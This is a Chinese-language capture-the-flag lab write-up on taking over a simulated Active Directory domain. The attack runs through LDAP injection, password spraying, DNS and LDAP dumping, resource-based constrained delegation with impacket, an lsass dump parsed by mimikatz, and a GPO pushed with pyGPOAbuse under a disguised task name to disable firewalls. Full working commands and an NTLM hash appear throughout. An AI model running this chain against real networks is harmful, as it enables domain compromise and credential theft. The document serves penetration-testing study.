# 团队模拟环境-How2UseLdap 实战

## 任务目标

获取到个人主机中的Flag

## 攻击路径

![](./img/7949284262792486079.png)

## 涉及的主要知识点

Ldap相关利用  
域外凭证利用  
基于资源的约束委派  
域控DNS获取  
GPO策略下发

## 机器情况

  * DC 10.0.0.10 [135,445,389,88]
  * Ldap 10.0.0.177 [80]
  * flag 10.0.0.12 [135,139,445]
  * rbcd win8 10.0.0.13 [135,139,445]
  * rbcd2 win12 10.0.0.14 [135,139,445]

## wirteup

### Ldap信息获取

首先通过对IP段进行扫描判断域内主机，以及域控机器

![](./img/3220322634762143222.png)  
![](./img/915332935996998145.png)

拿到资产信息后首先对已知ip进行端口扫描，发现只有`10.0.0.177`这台机器开放了Web端口。其他机器都开放了一些常规的端口，没有可以进行利用的点。目前主流的突破口都是从web方面进行突破，下面主要测试该Web应用是否存在一些可以利用的地方。

打开网站后，发现是员工信息查询页面，根据上面"请输入域账户"的提示，判断使用了域环境的验证方式。域环境验证的方式主要可以通过Ldap与Kerberos进行验证。这里需要确定他使用的验证方式。

![](./img/3021598128407708203.png)

一般发现web应用使用什么样的验证方式，可以使用下面几种方式来确定：

  * 通过网站页面信息
  * 网站验证方式选择框
  * 数据包
  * 网站源码泄露
  * phpinfo

进行目录扫描发现敏感文件，`phpinfo.php`,`readme.txt`。

![](./img/6736625930488809417.png)

当目标使用一些域内验证技术的时候需要开启对应的扩展，通过phpinfo，看到了目标开启了ldap支持。可以推断使用了ldap方式对用户进行验证。

![](./img/536928610127529530.png)

如果是ldap验证的话，在这里可以尝试利用ldap注入，来进行测试，账户登录一般使用`filter加上对应的ldap语法`去对值进行匹配，在语法中
_表示匹配所有。通过在ldap登录处尝试输入通配符`_ `，使其成功匹配。发现可以成功登录。

在登录过后发现，存在几百个用户，到这一步，我们就获取到了域内存在的账户，正常来说我们可以尝试直接对账户进行密码喷洒，但是对全部账户进行喷洒的话，动静会很大。这一步暂且停止。

![](./img/8873424845616393841.png)

通过观察之前的登录页面发现具有查询手机号和邮箱这两个选项，抓包发现其中的attr参数中的值，为ldap目录中用户对应的属性名，如email为`userprincipalname`,手机号为`homePhone`，这里笔者想既然应用直接使用用户属性中的名称，那么能否将该值设置为用户中的其他属性，从而显示其他的内容呢？

![](./img/5761296985149905490.png)

结合上面遇到的问题，可以通过对域内账户的权限进行判断，找到一些合适的账户。  
对于账户权限的判断，在ldap中可以通过用户属性`useraccountcontrol`对账户状态进行判断。

### ldap账户状态判断

这里通过将attr的值设置为`useraccountcontrol`，进行测试，发现能够成功查询，接下来可以利用它显示出来的内容判断用户的权限。

![](./img/4619912709958583313.png)

**（对该属性的值做一个简单解释）**  
一个账户具有不同的属性，而这个值就是不同属性相加之后得到的值。  
514=512+2=账号存在且关闭  
66048=65536+512=密码永不过期+账号正常

这里发现大部分账户的权限都为514也就是不可登录，我们筛选出66048的账户。  
收集为`66048`的账号：  
weishen  
weishentql  
dashe  
dashenb  
weizi666  
weizi

收集到可以登录的账户后对账户进行密码喷洒，找到能够进行登录的账号。

### ldap账户喷洒

这里配合上面的readme.txt文件中提示的密码对ldap账户进行喷洒。  
喷洒工具可以使用3gstudent师傅编写的一款喷洒ldap账户密码的powershell程序。

**工具地址：**  
<https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1>

    
    
    Set-ExecutionPolicy Bypass
    Import-Module .\ldap_password.ps1
    Invoke-DomainPasswordSprayOutsideTheDomain -Domain "10.0.0.10/DC=ds,DC=local" -UserList .\user.txt -Password p@ssw0rd -Verbose

这里通过对密码进行喷洒，我们获取可以登录的ldap凭证，然后我们可以利用这个凭证直接访问ldap数据库，查询其中的ldap信息，为了便于分析我们也可以通过Adfind将该域的ldap全部下载到本地进行查看。

![](./img/662767147365924574.png)

### dns信息导出

在一些域内有些机器可能被设置了防火墙，从而无法被扫描到。当我们获得凭证了，为了获取更为详细的域内机器，可以对域控dns服务器中的DNS信息进行查询，从而获取到一些被防火墙忽略的机器。

可以利用adidnsdump项目，来获取域控中的dns信息  
<https://github.com/dirkjanm/adidnsdump>

![](./img/603898963578907238.png)

可以发现域中还存在10.0.0.12这台机器没有被扫描到。

### ldap信息导出及分析

使用下面的语句可以从域外进行ldap信息的获取

    
    
    Adfind.exe * -h 10.0.0.10 -u <user> -up <password> > info.txt

![](./img/4275487461065588412.png)

将ldap导入到本地后。我们对文件进行分析，可以了解目前的域环境。  
主要关注域策略，账户、机器、组之间的关系。

通过ldap信息，我们可以获取组策略中的一些信息，密码尝试次数，过期时间，如果需要进一步喷洒，可以参考这些信息，对自己的喷洒方案进行调整。

![](./img/7123617936006009206.png)

![](./img/7832946546704540930.png)

尝试定位到用户。  
查看对应ldap内容可以了解该对象的常见的属性。

![](./img/4902314214770985903.png)

用户的话一般关注以下属性 whenCreated(创建时间) memberOf(所属组) userAccountControl(权限)
lastLogon(上次登录时间) pwdLastSet(上次密码修改时间) lastLogonTimestamp(上次登录时间)
通过这些可以确定账户的权限，账户当前的状态。

![](./img/3548991213864543530.png)

在对机器的ldap信息进行查看时发现，这里机器中存在mS-DS-CreatorSID这个属性，如果存在这个属性的话，表示这台机器是由某个域用户加入机器的，该域用户对该机器具有msDS-AllowedToActOnBehalfOfOtherIdentity权限，如果控制了这个账户那么就等于拿下了对应的机器

![](./img/4838638246443880770.png)

接下来查询具有mS-DS-CreatorSID属性的机器  
`AdFind.exe -h 10.0.0.10 -u dashe -up "p@ssw0rd" -b "DC=ds,DC=local" -f
"objectClass=computer" mS-DS-CreatorSID`

![](./img/1275302081774318361.png)

发现机器是由SID为`S-1-5-21-1946571181-3420340102-3117322147-1106` 的用户拉入域。该用户对该机器有控制权。  
通过搜索SID，发现该用户为`dashe`

![](./img/6422390948071260102.png)

### 基于资源的约束委派

若要利用基于资源的约束委派攻击，需要有权限控制机器账户中的msDS-AllowedToActOnBehalfOfOtherIdentity属性，之后我们需要利用当前域账户建立一个机器账户。之后使用该机器账户去向该机器进行委派。

在上文中提到经过验证的域账户具有将域外主机拉入域内的功能，这是由MAQ(MachineAccountQuota)进行的，MAQ允许域用户将计算机帐户对象添加到域。默认情况下，普通域账户可以创建
10 个计算机帐户。通过MAQ创建的账户会存放在域计算机组中。同时域用户对于他创建的机器账户具有对象属性的访问权限如(msDS-AllowedToActOnBehalfOfOtherIdentity)

同时通过之前的ldap，也能查询到对应的信息。

![](./img/7659123576729654786.png)

利用impacket-addcompute在域外添加服务账户

    
    
    impacket-addcomputer "ds.local/dashe:p@ssw0rd" -dc-ip 10.0.0.10 -computer-name test_computer598$ -computer-pass p@ssw0rd

![](./img/6510229015179569795.png)

相比较于非约束委派，约束委派是正向委派，由用户主动发起。接下来利用impacket套件中的rbcd将win8机器与服务账户test_computer598$建立委派。

    
    
    impacket-rbcd -delegate-to win8$ -delegate-from test_computer598$ -dc-ip 10.0.0.10 ds/dashe:p@ssw0rd -action write

![](./img/5612089854460887393.png)

### 票据导出

当建立委派之后进行票据导出

    
    
    impacket-getST -dc-ip 10.0.0.10 ds.local/test_computer598\$:p@ssw0rd -spn cifs/win8.ds.local -impersonate administrator

![](./img/5200517510530268467.png)

在进行票据导出的时候有一个需要注意的地方，这步操作需要与域控进行交互，所以需要与域控的时间同步。

在操作时如果提示 `clock Skew too great`，就是由于时间没有同步造成的。

![](./img/5926009271597009667.png)

经过搜索相关的资料发现可以使用下面的命令，将域控时间和本机时间直接同步  
`sudo ntpdate 10.0.0.10`

![](./img/7918737230270763520.png)

导入票据

`export KRB5CCNAME=administrator.ccache`

### dumphash

导入完该票据后，我们可以利用`impacket-smbclient`来上传mimikatz等工具来获取用户hash，这里笔者使用procdump获取dmp文件，本机mimikatz解析的方式获取hash。

#### 上传procdump

    
    
    impacket-smbclient administrator@win8.ds.local -k -no-pass -dc-ip 10.0.0.10
    info
    use c$
    put procdump64.exe

![](./img/1938554492006187257.png)

这里如果出现`无法连接445`的错误，是因为目前机器是在域外，没有域控的路由表，可以手动修改hosts文件。将win8.ds.local与他的ip对应。

![](./img/6160409333510756551.png)

    
    
    vim /etc/hosts
    sudo /etc/init.d/networking restart

![](./img/6250756308710918944.png)

也可以直接将域控的ip，设置为本机的dns服务器

![](./img/6346355104628354800.png)

#### 命令执行

利用`impacket-smbexec`执行命令，使procdump获取dmp文件

`impacket-smbexec administrator@win8.ds.local -k -no-pass -dc-ip 10.0.0.10`

![](./img/1083845178544813712.png)

`procdump64.exe -accepteula -ma lsass.exe lsass.dmp`

![](./img/6805625024951160262.png)

#### 导出下载

![](./img/3684311857115038219.png)

本地利用mimikatz解析lsass.dmp文件  
通过查看lsass.dmp 解密出来的hash，发现域管曾经登录过这台机器。从而拿到域管账户。

    
    
    mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit" > pssword.txt

![](./img/3376449844384667628.png)

接下来对10.0.0.12机器进行扫描，发现该机器不通，通过查看ldap文档中lastLogon属性的值，确定最后登录的时间，判断该机器是否存活。

![](./img/4881981181501382752.png)

利用windows中的w32tm.exe 可以对其进行解密，发现最后登录的时间是4月28号，判断应该是防火墙的原因导致不通。  
`w32tm.exe /ntte xxxxxxxx`

![](./img/1713917471374263988.png)

既然我们拿到了域管的账户，接下来登录域控，进行GPO策略的下发，从而关闭目标机器的防火墙，但是发现无法进行rdp连接。只能想办法通过使用命令的方式去添加GPO。

![](./img/3123921612324172625.png)

### GPO下发

使用命令创建策略可以利用github上面的pyGPOAbuse项目实现。  
<https://github.com/Hackndo/pyGPOAbuse>

安装时有一个需要注意的地方，使用pyGPOAbuse的时候，python需要大于3.8，不然安装msldap的时候会产生错误。

![](./img/238918940767389020.png)

这里指定域管的账户，与对应的ntlmhash，gpo_id，域控的地址。进行组策略的创建。  
需要注意的是此处的`GPO-id`为默认域GPO的组策略id。  
默认的组策略主要有两个：  
一个是域控的策略(6AC1786C-016F-11D2-945F-00C04fB984F9)  
一个是域机器的策略(31b2f340-016d-11d2-945f-00c04fb984f9)  
这里因为目标机器是域机器，我们需要使用31b2f340-016d-11d2-945f-00c04fb984f9作为组策略id。

    
    
    python3 pygpoabuse.py ds.local/administrator -hashes :f1b7ec38edc8b8046053884234a9d01a -gpo-id "31b2f340-016d-11d2-945f-00c04fb984f9" -powershell -command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False" -taskname "Completely Legit Task" -description "Dis is legit, pliz no delete" -dc-ip 10.0.0.10 -v

组策略添加成功

![](./img/289823709165691314.png)

之后等待目标机器执行组策略，执行策略后防火墙会关闭。

### flag 获取

之后可以通过psexec明文密码的方式访问目标机器获取flag。

![](./img/6045507019605535683.png)

## 总结

本环境在域渗透中属于基础知识，其中大多的技术点都是围绕ldap展开，之后利用委派拿下机器，dump域管hash，下发gpo关闭目标防火墙，获取flag。实际上对于获取ldap信息之后的利用也远远不止上面提到的内容。师傅们也可以继续查询相关的内容。

